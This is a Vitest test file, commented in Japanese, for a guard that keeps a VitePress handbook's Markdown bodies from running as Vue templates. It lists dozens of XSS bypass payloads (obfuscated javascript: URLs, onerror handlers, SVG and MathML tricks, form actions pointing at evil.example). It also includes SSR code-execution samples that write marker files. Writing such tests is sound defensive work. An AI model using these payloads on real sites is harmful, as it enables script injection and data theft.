/**
 * ハンドブックの Markdown の**本文**を Vue のテンプレートとして実行しない関所(`docs/.vitepress/body-guard.ts`)と、
 * 動的ルートの材料の拒否(`frontmatter-guard.ts` の `findDynamicRouteFiles`)のテスト(5 回目 C5-1・C5-5)。
 *
 * 5 回目 C5-1: 本文の `{{ [].constructor.constructor("…")() }}` と `<script setup>` が `vitepress build` の SSR で Node 上で実行された
 * (頭の関所は全部通った)。C5-5: `<<< @/../outside` は根の外のファイルを出力に埋め、`[x].paths.js` は設定の外で実行される。
 * ここでは (1) 判定の表(生の HTML の許可表・描画結果の許可表・動的ルートの名前)、(2) **本物の VitePress** の
 * 描画器に関所を付けて反例を当てる、(3) **本物の `vitepress build`** に反例を当て、マーカーが書かれないことを確かめる。
 *
 * @oversize 超える理由: 本文の関所の判定の表・描画器・build の 3 段を、同じ反例の並びで 1 か所に読み通せるようにするため。
 * @split-review 割る案と結果: 段ごとに割る案は、反例(マーカーを書く本文)を 3 つのファイルで重ねて持つことになり、
 *   1 つの反例の段ごとの結果を突き合わせにくくなるので採らない。build の道具は頭の関所のテストと同じ形の小さな関数に留める。
 */

import { spawnSync } from 'node:child_process';
import { withoutGitEnv } from '../../helpers/git-env.js';
import { cpSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, statSync, symlinkSync, writeFileSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import {
  RAW_HTML_TAGS,
  auditRenderedBody,
  installBodyGuard,
  isAllowedRawHtml,
} from '../../../../../docs/.vitepress/body-guard.js';
import { findDynamicRouteFiles, isDynamicRouteName } from '../../../../../docs/.vitepress/frontmatter-guard.js';

const REPO_ROOT = fileURLToPath(new URL('../../../../../', import.meta.url));
const DOCS = path.join(REPO_ROOT, 'docs');
const VITEPRESS = path.join(DOCS, 'node_modules/vitepress');

let work = '';

beforeAll(() => {
  mkdirSync(path.join(REPO_ROOT, 'tmp'), { recursive: true });
  work = mkdtempSync(path.join(REPO_ROOT, 'tmp', 'body-guard-'));
});

afterAll(() => {
  rmSync(work, { recursive: true, force: true });
});

function put(root: string, rel: string, source: string): void {
  const target = path.join(root, rel);
  mkdirSync(path.dirname(target), { recursive: true });
  writeFileSync(target, source);
}

/** 実行されたら `marker` を書く本文の補間(5 回目 C5-1 の反例の形)。 */
function mustache(marker: string): string {
  return `{{ [].constructor.constructor("process.getBuiltinModule('fs').writeFileSync(${JSON.stringify(marker).replace(/"/g, "'")}, 'ssr'); return 'x'")() }}`;
}

/** 実行されたら `marker` を書く `<script setup>`(5 回目 C5-1 の反例の形)。 */
function scriptSetup(marker: string): string {
  return `<script setup>\nimport fs from 'node:fs'\nif (typeof window === 'undefined') fs.writeFileSync(${JSON.stringify(marker)}, '1')\n</script>\n`;
}

describe('isAllowedRawHtml(手書きのページで生のまま通す HTML の許可表)', () => {
  const cases: readonly (readonly [string, boolean])[] = [
    ['<!-- 注釈 -->', true],
    ['<!-- 複数行\n の注釈 -->\n', true],
    ['<br>', true],
    ['<br/>', true],
    ['<br />', true],
    ['<code>', true],
    ['</code>', true],
    ['<DETAILS>', true],
    ['<!-- a --> <script>', false],
    ['<!-- a --><!-- b -->', false],
    ['<code v-pre>', false],
    ['<br class="x">', false],
    ['<span>', false],
    ['<div>', false],
    ['</div>', false],
    ['<script setup>', false],
    ['<style>', false],
    ['<component :is="x">', false],
    ['<Fold>', false],
    ['<img src=x onerror=alert(1)>', false],
    ['<dialog>', false],
    ['<!DOCTYPE html>', false],
    ['<?php ?>', false],
    // 6 回目 C6-6: ブラウザが途中で閉じる注釈(HTML の注釈の決まりを外れるもの)は生のまま通さない。
    ['<!-- a --!> <script>alert(1)</script> -->', false],
    ['<!--> <script>alert(1)</script> -->', false],
    ['<!---> <script>alert(1)</script> -->', false],
    ['<!-- a <!-- b -->', false],
    ['<!-- a <!--->', false],
    ['<!---->', true],
    ['<!-- a - b -- c -->', true],
  ];
  it.each(cases)('%j → %s', (content, expected) => {
    expect(isAllowedRawHtml(content)).toBe(expected);
  });

  it('許可表は属性の無い書式のタグだけ(div / span / a / img / script / style を含まない)', () => {
    for (const tag of ['div', 'span', 'a', 'img', 'script', 'style', 'iframe', 'template', 'slot', 'component']) {
      expect(RAW_HTML_TAGS.has(tag), tag).toBe(false);
    }
  });
});

describe('auditRenderedBody(描画結果の許可表)', () => {
  const page = (html: string, extra: { hoistedBlocks?: number; hasHead?: boolean } = {}) =>
    auditRenderedBody({ html, hoistedBlocks: extra.hoistedBlocks ?? 0, hasHead: extra.hasHead ?? false });

  it.each([
    ['素の段落', '<p>本文</p>'],
    ['v-pre の中の補間と指令の字面', '<div v-pre><p>{{ x }}</p><p :a="b" @c="d" v-html="e">t</p></div>'],
    ['コードの v-pre', '<div class="language-js"><pre v-pre><code>{{ a }}</code></pre></div>'],
    ['mermaid の図の形', '<Suspense><template #default><Mermaid id="mermaid-1" class="mermaid" graph="a"></Mermaid></template><template #fallback>Loading...</template></Suspense>'],
    ['空要素', '<p>a<br>b<img src="./a.png" alt="x"></p>'],
    ['決まりどおりの注釈', '<!-- 注釈 - と -- の並び --><p>a</p>'],
    ['URL でない to / values(SVG の外の属性)', '<p to="b" values="1;2"></p>'],
    // 7 回目 C7-8 の対照: 生成器が吐く色見本の style(カスタムプロパティの宣言だけ)と、ふつうの srcset・相対の href は通る。
    ['カスタムプロパティの宣言だけの style', '<span class="swatch" style="--swatch: var(--color-accent);"></span>'],
    ['本文の包みが付ける style(display:contents)', '<div v-pre class="docs-body" style="display:contents"><p>a</p></div>'],
    ['表の列の揃え(markdown-it が付ける style)', '<table><tr><th style="text-align:center">a</th><td style="text-align:right">b</td></tr></table>'],
    ['カスタムプロパティの宣言 2 つ', '<span style="--a: 1px; --b: var(--c)"></span>'],
    ['ふつうの srcset', '<img srcset="a.png 1x, b.png 2x" src="a.png">'],
    ['相対の href と https', '<a href="./x.md">x</a><a href="https://example.com/a?b=c,d">y</a>'],
    ['境界: 文字に javascript を含む相対の href', '<a href="./javascript-notes.md">x</a>'],
    // 8 回目 C8-7 の対照: SVG の同じ文書の中の参照(url(#id))と、url を含むだけの文字は通る。
    ['SVG の fill の url(#id)', '<svg><defs><linearGradient id="g"></linearGradient></defs><rect fill="url(#g)" stroke="url( \'#g\' )"/></svg>'],
    ['url を含むだけの title', '<p title="see url (below)">x</p>'],
    ['同じサイトの根からの action(画面の見本のログアウト)', '<form method="post" action="/api/auth/logout"><button type="submit">x</button></form>'],
    ['同じサイトの根からの formaction', '<button formaction="/api/x">x</button>'],
  ])('通る: %s', (_, html) => {
    expect(page(html)).toEqual([]);
  });

  it.each([
    ['v-pre の外の補間', '<p>{{ x }}</p>', '補間'],
    ['包みを閉じて抜けた補間', '<div v-pre>a</div>{{ y }}', '補間'],
    ['指令 v-html', '<p v-html="x"></p>', '指令'],
    ['指令 :title', '<p :title="x"></p>', '指令'],
    ['指令 @click', '<p @click="x"></p>', '指令'],
    ['動的な差し込み口の名前', '<Grid :cells="[]"><template #[x]>a</template></Grid>', '指令'],
    ['差し込み口の式', '<Grid :cells="[]"><template #a="p">a</template></Grid>', '指令'],
    ['component', '<component is="Fold"></component>', 'component'],
    ['is="vue:…"', '<div is="vue:Fold"></div>', '部品'],
    ['slot', '<slot></slot>', 'slot'],
    ['登録されていない部品', '<Content></Content>', '部品'],
    ['登録されていない部品(Fold)', '<Fold kind="detail"></Fold>', '部品'],
    ['式の属性(:cells)', '<Grid :cells="[1]"></Grid>', '指令'],
    ['script(v-pre の中でも)', '<div v-pre><script>alert(1)</script></div>', 'script'],
    ['style', '<style>a{}</style>', 'style'],
    ['iframe', '<iframe src="https://x"></iframe>', 'iframe'],
    ['on* の属性(v-pre の中でも)', '<div v-pre><img src="x" onerror="alert(1)"></div>', 'ハンドラ'],
    ['javascript: の href', '<a href=" java\tscript:alert(1)">x</a>', 'href'],
    ['data: の src', '<img src="data:text/html,x">', 'src'],
    ['srcdoc', '<p srcdoc="x"></p>', 'srcdoc'],
    ['閉じていないタグ', '<div><p>a</div>', '読めない'],
    // 6 回目 C6-6: 表に無かった入力の種類。
    ['SVG の set で href を javascript: に', '<svg><a><set attributeName="href" to="javascript:alert(1)"/><text>x</text></a></svg>', 'タグ <set>'],
    ['SVG の animate の values', '<svg><a><animate attributeName="href" values="0;javascript:alert(1)"/></a></svg>', 'タグ <animate>'],
    ['SVG の animateMotion(大文字を混ぜた名前)', '<svg><animateMotion path="M0"/></svg>', 'タグ <animateMotion>'],
    ['アニメーションの値の属性(タグの外でも)', '<p values="a;javascript:alert(1)"></p>', '危険な values'],
    ['to の属性', '<p to=" javascript:alert(1)"></p>', '危険な to'],
    ['実体参照で綴った URL(10 進)', '<a href="&#106;avascript:alert(1)">x</a>', 'href'],
    ['実体参照で綴った URL(16 進)', '<a href="&#x6A;avascript:alert(1)">x</a>', 'href'],
    ['実体参照で綴った URL(名前つきの &colon;)', '<a href="javascript&colon;alert(1)">x</a>', 'href'],
    ['--!> で閉じる注釈の後ろの script(ブラウザは注釈を閉じる)', '<!-- a --!> <script>alert(1)</script> -->', '注釈'],
    ['<!--> で閉じる注釈の後ろの script', '<!--> <script>alert(1)</script> -->', 'script'],
    ['formaction', '<button formaction="javascript:alert(1)">x</button>', '危険な formaction'],
    ['xlink:href', '<svg><a xlink:href="javascript:alert(1)">x</a></svg>', '危険な xlink:href'],
    ['form の action', '<form action="javascript:alert(1)"></form>', '危険な action'],
    ['video の poster', '<video poster="javascript:alert(1)"></video>', '危険な poster'],
    ['is の大文字', '<div IS="vue:Fold"></div>', 'is の属性'],
    // 7 回目 C7-8: 表に無かった入力の種類。
    ['srcset の並びの 2 つめに javascript:', '<img srcset="a.png 1x, javascript:alert(1) 2x">', '危険な srcset'],
    ['ping', '<a href="/x" ping="javascript:alert(1)">x</a>', '危険な ping'],
    ['background の属性', '<table background="javascript:alert(1)"></table>', '危険な background'],
    ['object の data', '<object data="javascript:alert(1)"></object>', 'タグ <object>'],
    ['embed の src', '<embed src="javascript:alert(1)">', 'タグ <embed>'],
    ['link の href', '<link rel="stylesheet" href="https://x/a.css">', 'タグ <link>'],
    ['base の href(後続の相対 URL を全部付け替える)', '<base href="https://evil.example/">', 'タグ <base>'],
    ['meta の http-equiv refresh(URL が content の中)', '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">', 'タグ <meta>'],
    ['style の url(javascript:)', '<p style="background:url(javascript:alert(1))">x</p>', 'style'],
    ['style の CSS のエスケープ', '<p style="background:url(\\6a avascript:alert(1))">x</p>', 'style'],
    ['style の外の url(https)(カスタムプロパティの宣言でない)', '<p style="background-image:url(https://evil.example/x.png)">x</p>', 'style'],
    ['境界: 包みの style に宣言を足す', '<div style="display:contents;background:url(https://x)"></div>', 'style'],
    ['style の @import', '<p style="@import \'https://x\'">x</p>', 'style'],
    ['vbscript:', '<a href="vbscript:msgbox(1)">x</a>', '危険な href'],
    ['大文字の scheme', '<a href="JAVASCRIPT:alert(1)">x</a>', '危険な href'],
    ['scheme の途中の改行', '<a href="java\nscript:alert(1)">x</a>', '危険な href'],
    ['scheme の途中の CR の実体参照', '<a href="java&#13;script:alert(1)">x</a>', '危険な href'],
    ['href の data:', '<a href="data:text/html,<script>alert(1)</script>">x</a>', '危険な href'],
    ['実体参照の 0 埋め(10 進)', '<a href="&#0000106;avascript:alert(1)">x</a>', '危険な href'],
    ['実体参照の 0 埋め(16 進)', '<a href="&#x000006A;avascript:alert(1)">x</a>', '危険な href'],
    ['実体参照の末尾の ; が無い形', '<a href="&#106avascript:alert(1)">x</a>', '危険な href'],
    ['実体参照の 16 進の大文字の X', '<a href="&#X6A;avascript:alert(1)">x</a>', '危険な href'],
    ['MathML の中の a', '<math><mtext><a href="javascript:alert(1)">x</a></mtext></math>', '危険な href'],
    ['MathML の要素の href', '<math><mi href="javascript:alert(1)">x</mi></math>', '危険な href'],
    ['MathML の maction', '<math><maction actiontype="statusline"><mi>x</mi><mi>y</mi></maction></math>', 'タグ <maction>'],
    ['SVG の use の href(data:)', '<svg><use href="data:image/svg+xml,&lt;svg&gt;"/></svg>', '危険な href'],
    ['SVG の image の href', '<svg><image href="javascript:alert(1)"/></svg>', '危険な href'],
    ['SVG の feImage の xlink:href', '<svg><filter><feImage xlink:href="javascript:alert(1)"/></filter></svg>', '危険な xlink:href'],
    ['noscript の中身', '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p></noscript>', 'タグ <noscript>'],
    // 8 回目 C8-7: 表に無かった入力の種類。
    ['xmp(中身を生の文字として読む)', '<xmp><p title="</xmp><img src=x onerror=alert(1)>"></p></xmp>', 'タグ <xmp>'],
    ['noembed', '<noembed><p title="</noembed><img src=x onerror=alert(1)>"></p></noembed>', 'タグ <noembed>'],
    ['noframes', '<noframes><p title="</noframes><img src=x onerror=alert(1)>"></p></noframes>', 'タグ <noframes>'],
    ['plaintext', '<plaintext>a</plaintext>', 'タグ <plaintext>'],
    ['portal', '<portal src="https://evil.example/"></portal>', 'タグ <portal>'],
    ['fencedframe', '<fencedframe src="https://evil.example/"></fencedframe>', 'タグ <fencedframe>'],
    ['大文字の HREF', '<a HREF="javascript:alert(1)">x</a>', '危険な HREF'],
    ['大文字の STYLE', '<p STYLE="background:url(https://evil.example/x.png)">x</p>', 'style'],
    ['大文字の SRCSET', '<img SRCSET="a.png 1x, javascript:alert(1) 2x">', '危険な SRCSET'],
    ['大文字の XLINK:HREF', '<svg><a XLINK:HREF="javascript:alert(1)">x</a></svg>', '危険な XLINK:HREF'],
    ['名前つきの空白の実体参照 &Tab;', '<a href="java&Tab;script:alert(1)">x</a>', '危険な href'],
    ['名前つきの空白の実体参照 &NewLine;', '<a href="java&NewLine;script:alert(1)">x</a>', '危険な href'],
    ['SVG の fill の url(外)', '<svg><rect fill="url(https://evil.example/a.svg#g)"/></svg>', 'url('],
    ['SVG の stroke の url(外)', '<svg><rect stroke="url(//evil.example/a.svg#g)"/></svg>', 'url('],
    ['SVG の filter の url(外)', '<svg><rect filter="url(&quot;https://evil.example/f.svg#f&quot;)"/></svg>', 'url('],
    ['SVG の mask の url(外)', '<svg><rect mask="url(https://evil.example/m.svg#m)"/></svg>', 'url('],
    ['SVG の clip-path の url(外)', '<svg><rect clip-path="url(https://evil.example/c.svg#c)"/></svg>', 'url('],
    ['SVG の marker-start の url(外)', '<svg><path marker-start="url(https://evil.example/m.svg#m)"/></svg>', 'url('],
    ['cursor の url(外)', '<svg><rect cursor="url(https://evil.example/c.png), auto"/></svg>', 'url('],
    ['url() の中の CSS のエスケープ', '<svg><rect fill="url(\\23 g)"/></svg>', 'url('],
    ['大文字の URL(', '<svg><rect FILL="URL(https://evil.example/a.svg#g)"/></svg>', 'url('],
    ['関数名の CSS のエスケープ(u\\72l( は url( と読まれる)', '<svg><rect fill="u\\72l(https://evil.example/a.svg#g)"/></svg>', 'url('],
    ['外へ向いた form の action', '<form action="https://evil.example/collect"><input name="q"></form>', 'action'],
    ['外へ向いた formaction', '<button formaction="https://evil.example/collect">x</button>', 'formaction'],
    ['scheme を省いた外の action(//…)', '<form action="//evil.example/x"></form>', 'action'],
    ['/\\ で始まる action(ブラウザは //… と読む)', '<form action="/\\evil.example/x"></form>', 'action'],
    ['空白を挟んだ //', '<form action=" / /evil.example/x"></form>', 'action'],
    ['相対の action(./x)', '<form action="./x"></form>', 'action'],
    ['値の無い action', '<form action></form>', 'action'],
    ['xml:base(相対 URL の基点を付け替える)', '<svg xml:base="https://evil.example/"><a href="x">x</a></svg>', 'xml:base'],
    ['xlink:base', '<svg><a xlink:base="https://evil.example/" xlink:href="x">x</a></svg>', 'xlink:base'],
    // 9 回目 C9-6: 表に無かった入力の種類。
    ['禁止タグの大文字 SCRIPT', '<div v-pre><SCRIPT>alert(1)</SCRIPT></div>', 'タグ <SCRIPT>'],
    ['禁止タグの大文字 IFRAME', '<IFRAME src="https://evil.example/"></IFRAME>', 'タグ <IFRAME>'],
    ['禁止タグの大文字小文字の混在 Noscript', '<Noscript><p>a</p></Noscript>', 'Noscript'],
    ['禁止タグの大文字 STYLE', '<STYLE>a{}</STYLE>', 'タグ <STYLE>'],
    ['frame', '<frame src="https://evil.example/">', 'タグ <frame>'],
    ['frameset', '<frameset><frame src="https://evil.example/"></frameset>', 'タグ <frameset>'],
    ['applet', '<applet code="X.class"></applet>', 'タグ <applet>'],
    ['数の実体参照の :(10 進 &#58;)', '<a href="javascript&#58;alert(1)">x</a>', '危険な href'],
    ['数の実体参照の :(16 進 &#x3A;)', '<a href="javascript&#x3A;alert(1)">x</a>', '危険な href'],
    ['数の実体参照の :(16 進の小文字 &#x3a; と 0 埋め)', '<a href="javascript&#x003a;alert(1)">x</a>', '危険な href'],
    // 重なった属性: Vue は読めないとして止め(関所も赤)、両方の値も検査に出る(ブラウザは前を採るが、どちらの順でも赤)。
    ['重なった属性(後ろが javascript:)', '<a href="/x" href="javascript:alert(1)">x</a>', '危険な href'],
    ['重なった属性(前が javascript:)', '<a href="javascript:alert(1)" href="/x">x</a>', '危険な href'],
    ['重なった属性(どちらも無害でも読めない形)', '<a href="/x" href="/y">x</a>', '読めない'],
    ['重なった属性の後ろが外への action', '<form action="/api/x" action="https://evil.example/">x</form>', '危険な action'],
    ['重なった属性の大文字小文字違い', '<a href="/x" HREF="javascript:alert(1)">x</a>', '危険な HREF'],
    ['大文字の ACTION(外へ)', '<form ACTION="https://evil.example/collect"></form>', '危険な ACTION'],
    ['大文字の FORMACTION(外へ)', '<button FORMACTION="https://evil.example/collect">x</button>', '危険な FORMACTION'],
    ['大文字の XML:BASE', '<svg XML:BASE="https://evil.example/"><a href="x">x</a></svg>', 'XML:BASE'],
    ['大文字小文字の混在 Xlink:Base', '<svg><a Xlink:Base="https://evil.example/" xlink:href="x">x</a></svg>', 'Xlink:Base'],
  ])('prose で拒む: %s', (_, html, expected) => {
    expect(page(html).join(' / ')).toContain(expected);
  });

  it('SFC の巻き上げと頭の head は拒む', () => {
    expect(page('<p>a</p>', { hoistedBlocks: 1 }).join()).toContain('巻き上げ');
    expect(page('<p>a</p>', { hasHead: true }).join()).toContain('head');
  });
});

describe('isDynamicRouteName / findDynamicRouteFiles(動的ルートの材料。C5-5)', () => {
  it.each([
    ['[x].md', true],
    ['[pkg].md', true],
    ['a[b.md', true],
    ['x.paths.js', true],
    ['[x].paths.ts', true],
    ['[x].paths.MJS', true],
    ['x.paths.cjs', true],
    ['x.md', false],
    ['paths.md', false],
    ['x.path.js', false],
    ['[x].txt', false],
  ])('%s → %s', (name, expected) => {
    expect(isDynamicRouteName(name)).toBe(expected);
  });

  it('どの深さでも見つけ、根の直下の node_modules / .vitepress は歩かない', () => {
    const root = path.join(work, 'dyn');
    put(root, 'rules/[x].md', '# x\n');
    put(root, 'design/deep/y.paths.js', 'export default {}\n');
    put(root, 'node_modules/[z].md', '# z\n');
    put(root, '.vitepress/w.paths.js', '');
    put(root, 'ok.md', '# ok\n');
    expect(findDynamicRouteFiles(root).sort()).toEqual([path.join('design', 'deep', 'y.paths.js'), path.join('rules', '[x].md')]);
  });

  it('実際の docs/ には無い', () => {
    expect(findDynamicRouteFiles(DOCS)).toEqual([]);
  });
});

/** 本物の VitePress の描画器(mermaid の部品と本文の関所を、本物の設定と同じ順で付ける)。 */
type Render = (source: string, relativePath: string) => { readonly html: string; readonly env: Record<string, unknown> };

describe('本物の VitePress の描画器に関所を付ける', () => {
  let render: Render = () => {
    throw new Error('未初期化');
  };

  beforeAll(async () => {
    const vitepress = (await import(pathToFileURL(path.join(VITEPRESS, 'dist/node/index.js')).href)) as {
      createMarkdownRenderer: (srcDir: string, options: object, base: string, logger: object) => Promise<{ render: (src: string, env: object) => string }>;
    };
    const mermaid = (await import(pathToFileURL(path.join(DOCS, 'node_modules/vitepress-plugin-mermaid/dist/vitepress-plugin-mermaid.es.mjs')).href)) as {
      MermaidMarkdown: (md: unknown, options: object) => void;
    };
    const md = await vitepress.createMarkdownRenderer(
      work,
      {
        config: (instance: Parameters<typeof installBodyGuard>[0]) => {
          mermaid.MermaidMarkdown(instance, {});
          installBodyGuard(instance);
        },
      },
      '/',
      { info: () => undefined, warn: () => undefined, error: () => undefined },
    );
    render = (source, relativePath) => {
      const env: Record<string, unknown> = { path: path.join(work, relativePath), relativePath, realPath: path.join(work, relativePath) };
      return { html: md.render(source, env), env };
    };
  });

  it('手書きのページの補間は v-pre の中の文字になる(実行されない)', () => {
    const marker = path.join(work, 'r-mustache.txt');
    const { html } = render(`# t\n\n本文 ${mustache(marker)}\n`, 'rules/zz.md');
    expect(html.startsWith('<div v-pre')).toBe(true);
    expect(auditRenderedBody({ html, hoistedBlocks: 0, hasHead: false })).toEqual([]);
    expect(existsSync(marker)).toBe(false);
  });

  it('手書きのページの <script setup> は文字として描かれ、SFC に巻き上げられない', () => {
    const { html, env } = render(`# t\n\n${scriptSetup(path.join(work, 'r-setup.txt'))}`, 'design/zz.md');
    expect(html).toContain('&lt;script setup&gt;');
    expect((env.sfcBlocks as { scripts: unknown[] }).scripts).toEqual([]);
  });

  it.each([
    ['</div> で包みを抜ける', '<p>a</p>\n\n</div>\n\n{{ 1 }}\n'],
    ['属性つきのタグ', '<p v-html="x">a</p>\n'],
    ['component', '<component :is="\'Fold\'"></component>\n'],
    ['行内の style', 'a <style>p{}</style> b\n'],
  ])('手書きのページの許可表の外の生の HTML は文字になる: %s', (_, source) => {
    const { html } = render(source, 'knowledge/zz.md');
    expect(auditRenderedBody({ html, hoistedBlocks: 0, hasHead: false })).toEqual([]);
    expect(html).toContain('&lt;');
  });

  it('許可表の中の生の HTML(注釈・<br>・対の <code>)はそのまま、対にならない閉じは文字になる', () => {
    const { html } = render('<!-- 注釈 -->\n\na<br>b <code>c</code> d <code v-pre>e</code> f\n', 'rules/zz.md');
    expect(html).toContain('<!-- 注釈 -->');
    expect(html).toContain('a<br>b <code>c</code> d &lt;code v-pre&gt;e&lt;/code&gt; f');
  });

  it('根の段の mermaid の図は包みの外に置かれ、部品として描かれる', () => {
    const { html } = render('# t\n\n```mermaid\ngraph TD; A-->B\n```\n\n後\n', 'rules/zz.md');
    const outside = html.replace(/<div v-pre class="docs-body"[\s\S]*?<\/div>\n/g, '');
    expect(outside).toContain('<Mermaid');
    expect(auditRenderedBody({ html, hoistedBlocks: 0, hasHead: false })).toEqual([]);
  });

  it('コード片の取り込み(<<<)はどのページでも例外になる(根の外のファイルを読まない)', () => {
    put(work, 'outside/secret.env', 'SECRET_TOKEN=abc123\n');
    for (const rel of ['rules/zz.md', 'design/zz.md']) {
      expect(() => render('# t\n\n<<< ../outside/secret.env\n', rel), rel).toThrow(/<<</);
      expect(() => render('# t\n\n- a\n\n  <<< @/outside/secret.env\n', rel), rel).toThrow(/<<</);
    }
  });

  it('頭の head は例外になる', () => {
    expect(() => render('---\nhead: [[script, {}, "alert(1)"]]\n---\n# t\n', 'rules/zz.md')).toThrow(/head/);
  });

  it('実際の docs/ の全ページが関所を通る(関所が正常な体系を止めない)', () => {
    const files: string[] = [];
    const walk = (dir: string, atRoot: boolean): void => {
      for (const name of readdirSync(dir)) {
        if (atRoot && (name === 'node_modules' || name === '.vitepress')) continue;
        const target = path.join(dir, name);
        if (statSync(target).isDirectory()) walk(target, false);
        // VitePress の srcExclude(`**/template.md` / `**/template.*.md`)は描かないので見ない
        else if (name.endsWith('.md') && !/^template(\..*)?\.md$/.test(name)) files.push(target);
      }
    };
    walk(DOCS, true);
    expect(files.length).toBeGreaterThan(100);
    const failures = files.flatMap((file) => {
      try {
        render(readFileSync(file, 'utf8'), path.relative(DOCS, file));
        return [];
      } catch (error) {
        return [`${path.relative(DOCS, file)}: ${error instanceof Error ? error.message.slice(0, 200) : String(error)}`];
      }
    });
    expect(failures).toEqual([]);
  });
});

describe('本物の vitepress build に反例を当てる', () => {
  // 小さな木に docs/.vitepress の設定一式を複写し、docs の node_modules を引いて本物の `vitepress build` を回す(頭の関所のテストと同じ形)。
  function buildSite(site: string, extra: (site: string) => void): ReturnType<typeof spawnSync> {
    mkdirSync(site, { recursive: true });
    cpSync(path.join(DOCS, '.vitepress'), path.join(site, '.vitepress'), {
      recursive: true,
      filter: (source) => !['dist', 'cache', 'theme'].some((name) => source.includes(`${path.sep}.vitepress${path.sep}${name}`)),
    });
    symlinkSync(path.join(DOCS, 'node_modules'), path.join(site, 'node_modules'));
    for (const dir of ['rules', 'specs']) put(site, `${dir}/README.md`, `# ${dir}\n`);
    put(site, 'index.md', '# home\n');
    put(site, 'package.json', '{"type":"module"}');
    extra(site);
    return spawnSync(process.execPath, [path.join(VITEPRESS, 'bin/vitepress.js'), 'build', '.'], { cwd: site, encoding: 'utf8', timeout: 300_000, env: withoutGitEnv() });
  }

  const output = (result: ReturnType<typeof spawnSync>): string => `${String(result.stdout)}${String(result.stderr)}`;

  it('手書きのページの補間と <script setup>(C5-1 の反例)は build が通っても実行されない', () => {
    const mustacheMarker = path.join(work, 'BUILD_MUSTACHE.txt');
    const setupMarker = path.join(work, 'BUILD_SETUP.txt');
    const site = path.join(work, 'prose-site');
    const result = buildSite(site, (root) => {
      put(root, 'rules/zz-evil.md', `# z\n\n本文 ${mustache(mustacheMarker)}\n`);
      put(root, 'knowledge/b.md', `# b\n\n${scriptSetup(setupMarker)}`);
    });
    expect(output(result)).toContain('build complete');
    expect(existsSync(mustacheMarker)).toBe(false);
    expect(existsSync(setupMarker)).toBe(false);
    // 字面のまま出ている(補間されていない)
    expect(readFileSync(path.join(site, '.vitepress/dist/rules/zz-evil.html'), 'utf8')).toContain('constructor.constructor');
  }, 360_000);

  it('<<< の取り込み(C5-5)は build が失敗し、根の外の中身は出力に出ない', () => {
    put(work, 'outside-secret.env', 'SECRET_TOKEN=abc123\n');
    const site = path.join(work, 'snippet-site');
    const result = buildSite(site, (root) => put(root, 'index.md', '# home\n\n<<< @/../outside-secret.env\n'));
    expect(result.status).not.toBe(0);
    expect(output(result)).toContain('<<<');
    expect(output(result)).not.toContain('abc123');
  }, 360_000);

  it('動的ルートの .paths.js(C5-5)は設定を読む時点で拒み、実行されない', () => {
    const marker = path.join(work, 'BUILD_PATHS.txt');
    const result = buildSite(path.join(work, 'paths-site'), (root) => {
      put(root, 'rules/[pkg].md', '# {{ $params.pkg }}\n');
      put(root, 'rules/[pkg].paths.js', `import fs from 'node:fs'\nfs.writeFileSync(${JSON.stringify(marker)}, '1')\nexport default { paths: () => [{ params: { pkg: 'a' } }] }\n`);
    });
    expect(result.status).not.toBe(0);
    expect(output(result)).toContain('[pkg]');
    expect(existsSync(marker)).toBe(false);
  }, 360_000);

  it('対照: 無害な木(mermaid の図・注釈・<br> を含む)は同じ手順で通る', () => {
    const result = buildSite(path.join(work, 'ok-site'), (root) =>
      put(root, 'rules/ok.md', '# ok\n\n<!-- 注釈 -->\n\na<br>b `{{ code }}`\n\n```mermaid\ngraph TD; A-->B\n```\n'),
    );
    expect(output(result)).toContain('build complete');
    expect(result.status).toBe(0);
  }, 360_000);
});
